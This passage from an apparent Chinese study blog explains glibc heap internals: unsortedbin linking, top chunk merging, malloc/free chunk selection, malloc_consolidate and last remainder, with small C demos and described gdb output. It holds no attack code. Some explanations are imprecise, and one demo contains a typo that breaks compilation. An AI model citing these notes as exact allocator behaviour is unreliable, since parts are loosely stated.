title="2.unsortedbin的双向链表存储结构"></a>2.unsortedbin的双向链表存储结构</h4><ul><li>free的chunk大小如果大于0x80会放到unsortedbin上</li><li>unsortedbin存储这些chunk是使用双向循环链表进行存储的（<strong>smallbins、largebins也是如此，此处只介绍unsortedbin</strong>）</li></ul><blockquote><p><strong>存储结构</strong>：</p><ul><li><strong>存储循环先入先出（FIFO）原则：</strong>上面的是先free掉的chunk，下面是后free掉的chunk；同理，通过malloc取出chunk时是先取上面的，再取下面的</li><li><strong>一个bins中只有一个freechunk时：</strong>就是下面这种表示形式。可以看到freechunk的fd和bk都指向于bins的fd，所以我们使用gdb调试时可以用命令看到，当bin链中只有一个freechunk时，其fd和bk都是相同的，都指向于bins的fd</li></ul><p><img src="/2020/12/15/%E5%A0%86/20190729213257204.png" alt="img"></p><ul><li><strong>一个bins中有多个freechunk时：</strong>上面使我们的struct malloc_state结构体，结构体中的bins数组存储的就是这些bin链，下面就是bins数组中存储unsortedbin的位置，这个数组元素存储的其实就是一个fd和一个bk指针。下面第一个就是第一个free掉的chunk，再下面一个就是第二个free掉的chunk……以此类推</li></ul><p><img src="/2020/12/15/%E5%A0%86/20190729212907497.png" alt="img"></p></blockquote><p><strong>演示</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x100</span>;</span><br><span class="line">    <span class="keyword">int</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">int</span> *temp=<span class="built_in">malloc</span>(<span class="built_in">size</span>); <span class="comment">//防止p1与p2合并</span></span><br><span class="line">    <span class="keyword">int</span> *p2=<span class="built_in">malloc</span>(<span class="built_in">size</span>);   </span><br><span class="line">    <span class="keyword">int</span> *p3=<span class="built_in">malloc</span>(<span class="built_in">size</span>);   <span class="comment">//防止p2被top chunk合并</span></span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>打断点</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215163335296.png" alt="image-20201215163335296"></p><p>释放p1</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215163518823.png" alt="image-20201215163518823"></p><p>从上面我们也可以看到下一个chunk的标志p位为0了</p><p>看下main_arena</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215163755383.png" alt="image-20201215163755383"></p><p>释放p2</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215164417439.png" alt="image-20201215164417439"></p><p>可以看到main_arena是变了的</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215165029835.png" alt="image-20201215165029835"></p><p>bins头中fd-&gt;p2 bk-&gt;p1</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215170240262.png" alt="image-20201215170240262"> </p><p>演示完成</p></blockquote><h3 id="0x11-top-chunk的向前合并"><a href="#0x11-top-chunk的向前合并" class="headerlink" title="0x11 top chunk的向前合并"></a>0x11 top chunk的向前合并</h3><h4 id="1-top-chunk概念"><a href="#1-top-chunk概念" class="headerlink" title="1.top chunk概念"></a>1.top chunk概念</h4><ul><li>当我们分配一块堆内存时，top chunk是出于地址的最高处的，其前面就是我们所申请的chunk</li></ul><h4 id="2-top-chunk的合并操作"><a href="#2-top-chunk的合并操作" class="headerlink" title="2.top chunk的合并操作"></a>2.top chunk的合并操作</h4><ul><li>如果top chunk前面的chunk不是fast chunk并且处于空闲，那么top chunk就会合并这个chunk</li><li>如果top chunk前面的chunk是fast chunk，不论是否空闲，top chunk都不会合并这个chunk</li></ul><h4 id="3-演示-1"><a href="#3-演示-1" class="headerlink" title="3.演示"></a>3.演示</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0</span>); <span class="comment">//只为了程序打断点，无其他作用</span></span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>断点 堆信息</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215194907019.png" alt="image-20201215194907019"></p><p>释放p2 可以看到p2是fastbins 未被合并</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215194956787.png" alt="image-20201215194956787"></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0</span>); <span class="comment">//只为了程序打断点，无其他作用</span></span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>断点</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215195122071.png" alt="image-20201215195122071"></p><p>释放p2 可以看到p2被合并了</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215195147425.png" alt="image-20201215195147425"></p></blockquote><h4 id="4-如何防止top-chunk的合并"><a href="#4-如何防止top-chunk的合并" class="headerlink" title="4.如何防止top chunk的合并"></a>4.如何防止top chunk的合并</h4><ul><li>只需要在free掉的chunk后面继续申请一个chunk，这样top chunk就不会合并之前的chunk</li></ul><h3 id="0x12-chunk的malloc、free"><a href="#0x12-chunk的malloc、free" class="headerlink" title="0x12 chunk的malloc、free"></a>0x12 chunk的malloc、free</h3><h4 id="1-malloc的机制"><a href="#1-malloc的机制" class="headerlink" title="1.malloc的机制"></a>1.malloc的机制</h4><ul><li><strong>如果程序是第一次malloc：</strong>会创建一个很大的“top chunk”</li><li><strong>如果程序是第二次及之后malloc：</strong>会去先向bins链表寻找空间，如果没有再去向“top chunk”要空间；如果“top chunk”使用完了再通过glibc重新申请一块新的“top chunk”</li></ul><h4 id="2-演示"><a href="#2-演示" class="headerlink" title="2.演示"></a>2.演示</h4><p>上面我们已经演示过很多回了 第一次就不演示了 这里主要来看一下第二次的malloc</p><p>这里是拿fastbin的例子</p><h5 id="恰好分割一整块的free-chunk（fastbin）"><a href="#恰好分割一整块的free-chunk（fastbin）" class="headerlink" title="恰好分割一整块的free chunk（fastbin）"></a><strong>恰好分割一整块的free chunk（fastbin）</strong></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    sleep(<span class="number">0</span>); <span class="comment">//只为了程序打断点，无其他作用</span></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>直接看free掉p1之后可以看到是进入fastbin了</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215200256907.png" alt="image-20201215200256907"></p><p><img src="/2020/12/15/%E5%A0%86/image-20201215200306820.png" alt="image-20201215200306820"></p><p>我们在来申请p2 可以看见是直接覆盖了p1</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215200355918.png" alt="image-20201215200355918"></p></blockquote><h5 id="切割一块chunk（fastbin）"><a href="#切割一块chunk（fastbin）" class="headerlink" title="切割一块chunk（fastbin）"></a><strong>切割一块chunk（fastbin）</strong></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);    sleep(<span class="number">0</span>); <span class="comment">//只为了程序打断点，无其他作用</span></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我们直接看p2分配之后把</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215200826010.png" alt="image-20201215200826010"></p><p>这里可以看出它并未用fastbin的chunk 而是从top chunk切割了一部分</p></blockquote><h5 id="恰好分割一整块的free-chunk（unsorted-bin）"><a href="#恰好分割一整块的free-chunk（unsorted-bin）" class="headerlink" title="恰好分割一整块的free chunk（unsorted bin）"></a><strong>恰好分割一整块的free chunk（unsorted bin）</strong></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x200</span>;</span><br><span class="line">    <span class="keyword">void</span> *p=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="built_in">size</span>); <span class="comment">//为了达到演示效果，防止p被top chunk合并</span></span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//只为了打断点使用</span></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *p3=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>看一下chunk的信息</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215201134939.png" alt="image-20201215201134939"></p><p>free p1，将p1放入了unsorted bin中</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215201206634.png" alt="image-20201215201206634"></p><p>分配p3 可以看到是直接覆盖p1的地方</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215201235306.png" alt="image-20201215201235306"></p></blockquote><h5 id="切割一块chunk（unsorted-bin）"><a href="#切割一块chunk（unsorted-bin）" class="headerlink" title="切割一块chunk（unsorted bin）"></a><strong>切割一块chunk（unsorted bin）</strong></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">void</span> *temp=<span class="built_in">malloc</span>(<span class="number">0x100</span>); <span class="comment">//为了防止p被topchunk合并</span></span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//只为了打断点使用</span></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里我们直接看p2分配之后</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215201554898.png" alt="image-20201215201554898"></p><p>这里为什么会出现这个情况呢？</p><p>其实它是在unsorted bin中切割了一块符合自己大小的chunk 拿出来分配</p></blockquote><p><strong>分割一块较大的free chunk（unsorted bin）</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">void</span> *temp=<span class="built_in">malloc</span>(<span class="number">0x100</span>); <span class="comment">//为了防止p被topchunk合并</span></span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//只为了打断点使用</span></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">    <span class="built_in">free</span>(p2);c</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>根据上面的理论这回就应该去top chunk中切割了 事实也确实如此</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215202105325.png" alt="image-20201215202105325"></p></blockquote><p>经过以上演示我们不难得出一下结论</p><ol><li>只要切割大小正好 它就会从已free的chunk中寻找</li><li>关于fastbin 和 unsorted bin中free chunk分配是不一样的</li><li>如果较大 会从top chunk中寻找</li></ol><h4 id="3-free的机制"><a href="#3-free的机制" class="headerlink" title="3.free的机制"></a>3.free的机制</h4><ul><li>①如果free的chunk的大小在0x20~0x80之间（fastbin的范围），那么该chunk直接放到fast bin上</li><li>②如果free的chunk的大小大于0x80（大于fast bin的范围），此时不会直接放到small bin或者large bin上面。而是放到unsorted bin上面</li></ul><h3 id="0x13-malloc-consolidate"><a href="#0x13-malloc-consolidate" class="headerlink" title="0x13 malloc_consolidate"></a>0x13 malloc_consolidate</h3><p><strong>这个主要是解决unsorted bin中的碎片化，整合成新的bin，也就是放入small bin或large bin中</strong></p><h4 id="1-consolidate的定义"><a href="#1-consolidate的定义" class="headerlink" title="1.consolidate的定义"></a>1.consolidate的定义</h4><ul><li>我们知道大于0x80的chunk被释放之后就放到了unsortedbin上面去，但是unsortedbin是一个未分类的bin，上面的chunk也处于未分类的状态。但是这些chunk需要在特定的条件下被整理然后放入到smallbins或者largebins中</li><li>这个整理的过程被称为unsortedbin的“consolidate”，但是“consolidate”是要在特定的条件下才会发生的，并且与malloc紧密相关</li></ul><h4 id="2-触发场景"><a href="#2-触发场景" class="headerlink" title="2.触发场景"></a>2.触发场景</h4><ul><li>当我们malloc一个chunk，这个chunk的大小大于smallbin的范围，在unsortedbin中寻找可用的freechunk使用时，会触发malloc_conlolidate</li></ul><p><img src="/2020/12/15/%E5%A0%86/20190810155737453.png" alt="img"></p><ul><li>malloc时如果bin链中没有可以使用的freechunk，并且去切割topchunk，发现topchunk也不够用，此时回去再去调用malloc_consolidate进行一次整理</li></ul><p><img src="/2020/12/15/%E5%A0%86/20190810155901661.png" alt="img"></p><ul><li>发现unsortedbin中有大的freechunk可以切割给malloc使用时，切割unsortedbin，产生last remainder的时候会consolidate</li></ul><p><strong>着重强调，1和2都会去寻找fastbin中的free chunk</strong></p><h4 id="3-具体分析"><a href="#3-具体分析" class="headerlink" title="3.具体分析"></a>3.具体分析</h4><p><strong>当我们malloc一个大小大于smallbin的chunk时：</strong></p><ul><li><p><strong>第一步：</strong>将fastbins中的chunk都整理到unsortedbin中，整理的过程中如果有物理相邻且空闲的fastchunk就合并，如果fastchunk与topchunk相邻，那么fastchunk就与topchunk合并（这个过程发生在_int_malloc函数调用的malloc_consolidate函数中）</p></li><li><p><strong>第二步：</strong>malloc去检查unsortedbin中是否有与自己malloc大小相对应的chunk可以使用，如果有与自己malloc大小相对应的chunk可以使用就直接使用；如果没有那么就去判断unsortedbin中是否有可以用来切割的大chunk可以使用，如果可以切割，就切割大的chunk使用，然后产生last remainder（这个过程发生在_int_malloc函数的for循环中）</p></li><li><strong>第三步：</strong>如果没有可以切割的大chunk可以使用，此时就将unsortedbin上的chunk放入到对应的bins链上</li><li><strong>第四步：</strong>malloc从第一次分配的大堆块上面找空间来使用</li></ul><h4 id="4-演示一"><a href="#4-演示一" class="headerlink" title="4.演示一"></a>4.演示一</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>); <span class="comment">//只为了程序打断点使用，无其他作用</span></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>打断点 看堆信息</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216141039796.png" alt="image-20201216141039796"></p><p>释放p1 看到进入fastbin中</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216141113312.png" alt="image-20201216141113312"></p><p>分配p2 可以看到我们p1好像是被覆盖了  我们具体来说一下这个过程</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216141143610.png" alt="image-20201216141143610"></p><p><img src="/2020/12/15/%E5%A0%86/image-20201216141159043.png" alt="image-20201216141159043"></p><p>当分配比small bin大的chunk时，我们就会触发consolidate，</p><ol><li>我们知道fastchunk是不会合并的 所以它们这时就会进入unsortedbin中</li><li>然后malloc去切割unsortedbin中的这个freechunk，发现不能够切割，于是就放入smallbin中，放入smallbin中之后便成为smallchunk了，就可以与topchunk合并了</li><li>合并之后malloc从topchunk中申请一个堆块</li></ol></blockquote><h4 id="5-演示二"><a href="#5-演示二" class="headerlink" title="5.演示二"></a>5.演示二</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    sleep(<span class="number">0</span>); <span class="comment">//只为了程序打断点使用，无其他作用</span></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line"> <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>释放p1和p</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216142837517.png" alt="image-20201216142837517"></p><p>下面我们猜想会发送什么?</p><p>由于分配chunk较大 所以我们会触发consolidate 这时两个fastchunk就会进入unsortedbin中 根据上面规则 它下一步就会进入small bins</p><p>又因为和top chunk相邻 所以top chunk会合并 </p><p>直观感觉就是我们覆盖了之前的chunk</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216143203315.png" alt="image-20201216143203315"></p></blockquote><h3 id="0x14-last-remainder"><a href="#0x14-last-remainder" class="headerlink" title="0x14 last remainder"></a>0x14 last remainder</h3><h4 id="1-定义"><a href="#1-定义" class="headerlink" title="1.定义"></a>1.定义</h4><ul><li>如果在bins链中存在freechunk时，当我们去malloc的时候，malloc的请求大小比freechunk的大小小，那么arena就会切割这个freechunk给malloc使用，那么切割之后剩余的chunk就<strong>被称为“last remainder”</strong></li><li>当产生last remainder之后，表示arena的<strong>malloc_state结构体中的last_remainder成员</strong>指针就会<strong>被初始化</strong>，并且指向这个last remainder</li></ul><h4 id="2-产生场景"><a href="#2-产生场景" class="headerlink" title="2.产生场景"></a>2.产生场景</h4><ul><li>malloc的时候，不论malloc的大小，首先会去检查每个bins链（出去fastbins链）是否有与malloc相等大小的freechunk，如果没有就去检查bins链中是否有大的freechunk可以切割，如果切割，那么就切割大的freechunk，那么切割之后的chunk成为last remainder，并且last remainder会被放入到unsortedbin中</li></ul><blockquote><p><strong>切割unsortedbin中的大chunk时：</strong></p><p>当unsortedbin有对应的freechunk可以给malloc切割使用时，unsortedbin会发生以下步骤：</p><ul><li>①先将这些freechunk放置到对应大小的bins链上（放入smallbin或largebin）</li><li>②放置到对应的bins链上之后，切割此freechunk</li><li>③切割之后会产生last remainder，再将last remainder放到unsortedbin上</li></ul><p><strong>例如：</strong></p><ul><li>此时，unsortedbin有两个0x800的freechunk</li><li>此时申请一个0x600的chunk</li><li>那么unsortedbin会先consolidate，把两个0x800的freechunk先移动到largebin中</li><li>然后再切割largebin的freechunk，将切割后余留下的0x200放入unsortedbin</li></ul><p><strong>切割smallbins、largebins中的大chunk时：</strong></p><ul><li>①切割smallbins或者largebins中的大freechunk，产生last remainder</li><li>②将last remainder放入到unsortedbin中</li></ul></blockquote><h4 id="3-last-remainder的consolidate"><a href="#3-last-remainder的consolidate" class="headerlink" title="3.last remainder的consolidate"></a>3.last remainder的consolidate</h4><p>当我们切割一个bins链中的大chunk时产生last reminader时，会发生consolidate，<strong>但是此种consolidate不会去整理fastbins中的freechunk（重点）</strong></p><h4 id="4-演示一-1"><a href="#4-演示一-1" class="headerlink" title="4.演示一"></a>4.演示一</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span 